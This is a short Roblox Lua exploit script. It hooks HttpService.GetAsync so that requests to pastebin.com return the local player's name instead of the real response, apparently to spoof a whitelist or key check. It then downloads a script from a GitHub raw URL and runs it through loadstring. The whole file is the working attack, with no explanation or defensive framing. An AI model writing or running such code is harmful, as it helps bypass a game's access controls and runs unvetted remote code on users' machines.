local HttpService = game:GetService("HttpService")
local oldGetAsync
oldGetAsync = hookfunction(HttpService.GetAsync, function(self, url)
    if type(url) == "string" then
        if string.match(url, "^https://pastebin%.com") then
            return game.Players.LocalPlayer.Name
        end
    end
    return oldGetAsync(self, url)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/skidscript/refs/heads/main/trust-lua-lol.lua.txt"))()
